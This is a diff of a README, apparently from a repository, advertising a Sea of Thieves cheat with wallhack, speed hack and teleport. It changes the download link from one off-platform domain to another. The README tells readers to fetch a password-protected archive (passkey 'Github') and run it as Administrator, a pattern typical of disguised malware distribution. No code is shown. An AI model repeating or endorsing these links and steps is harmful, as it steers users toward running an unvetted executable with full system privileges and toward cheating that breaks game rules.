@@ -6,7 +6,7 @@ Sea of Thieves external hack with ESP wallhack, speed hack, teleport, unlock all
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -76,7 +76,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Sea of Thieves.
 4. Run the hack **as Administrator**.
